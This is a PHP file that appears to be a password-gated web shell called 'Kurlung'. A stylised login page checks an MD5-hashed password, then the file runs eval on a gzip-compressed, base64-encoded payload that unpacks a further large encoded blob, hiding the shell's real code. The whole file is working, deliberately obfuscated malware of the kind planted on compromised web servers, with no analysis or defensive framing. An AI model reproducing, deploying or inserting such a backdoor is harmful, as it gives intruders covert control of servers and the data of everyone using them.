<?php
session_start();
$password = "76fdd00d9db694259b003d95f9dd66cc";

function login_shell()
{
?>

<!DOCTYPE html>

<html lang="en"> 

 <head> 

  <meta charset="UTF-8"> 

  <title>Kurlung</title> 

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap');
*
{
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Quicksand', sans-serif;
}
body 
{
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  background: #000;
}
section 
{
  position: absolute;
  width: 100vw;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 2px;
  flex-wrap: wrap;
  overflow: hidden;
}
section::before 
{
  content: '';
  position: absolute;
  width: 100%;
  height: 100%;
  background: linear-gradient(#000,#0f0,#000);
  animation: animate 5s linear infinite;
}
@keyframes animate 
{
  0%
  {
    transform: translateY(-100%);
  }
  100%
  {
    transform: translateY(100%);
  }
}
section span 
{
  position: relative;
  display: block;
  width: calc(6.25vw - 2px);
  height: calc(6.25vw - 2px);
  background: #181818;
  z-index: 2;
  transition: 1.5s;
}
section span:hover 
{
  background: #0f0;
  transition: 0s;
}

section .signin
{
  position: absolute;
  width: 400px;
  background: #222;  
  z-index: 1000;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 40px;
  border-radius: 4px;
  box-shadow: 0 15px 35px rgba(0,0,0,9);
}
section .signin .content 
{
  position: relative;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  gap: 40px;
}
section .signin .content h2 
{
  font-size: 2em;
  color: #0f0;
  text-transform: uppercase;
}
section .signin .content .form 
{
  width: 100%;
  display: flex;
  flex-direction: column;
  gap: 25px;
}
section .signin .content .form .inputBox
{
  position: relative;
  width: 100%;
}
section .signin .content .form .inputBox input 
{
  position: relative;
  width: 100%;
  background: #333;
  border: none;
  outline: none;
  padding: 25px 10px 7.5px;
  border-radius: 4px;
  color: #fff;
  font-weight: 500;
  font-size: 1em;
}
section .signin .content .form .inputBox i 
{
  position: absolute;
  left: 0;
  padding: 15px 10px;
  font-style: normal;
  color: #aaa;
  transition: 0.5s;
  pointer-events: none;
}
.signin .content .form .inputBox input:focus ~ i,
.signin .content .form .inputBox input:valid ~ i
{
  transform: translateY(-7.5px);
  font-size: 0.8em;
  color: #fff;
}
.signin .content .form .links 
{
  position: relative;
  width: 100%;
  display: flex;
  justify-content: space-between;
}
.signin .content .form .links a 
{
  color: #fff;
  text-decoration: none;
}
.signin .content .form .links a:nth-child(2)
{
  color: #0f0;
  font-weight: 600;
}
.signin .content .form .inputBox input[type="submit"]
{
  padding: 10px;
  background: #0f0;
  color: #000;
  font-weight: 600;
  font-size: 1.35em;
  letter-spacing: 0.05em;
  cursor: pointer;
}
input[type="submit"]:active
{
  opacity: 0.6;
}
@media (max-width: 900px)
{
  section span 
  {
    width: calc(10vw - 2px);
    height: calc(10vw - 2px);
  }
}
@media (max-width: 600px)
{
  section span 
  {
    width: calc(20vw - 2px);
    height: calc(20vw - 2px);
  }
}
  </style>

 </head> 

 <body> <!-- partial:index.partial.html --> 

  <section> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> 

   <div class="signin"> 

    <div class="content"> 

     <h2>KURLUNG</h2> 

     <div class="form"> 

      <div class="inputBox"> 
      </div> 
      <form class="login-container" action="" method="post">
      <div class="inputBox"> 

       <input type="password" required name="pass"> <i>Password</i> 

      </div> 

      <div class="links"> <a href="#"></a> <a href="#"></a> 

      </div> 

      <div class="inputBox"> 

       <input style="margin-top: 20px;" type="submit" name="submit" value="Login"> 

      </div> 

     </div> 

    </div> 

   </div> 

  </section> <!-- partial --> 

 </body>

</html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
?>
<?php
$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
$Lix = "=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";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>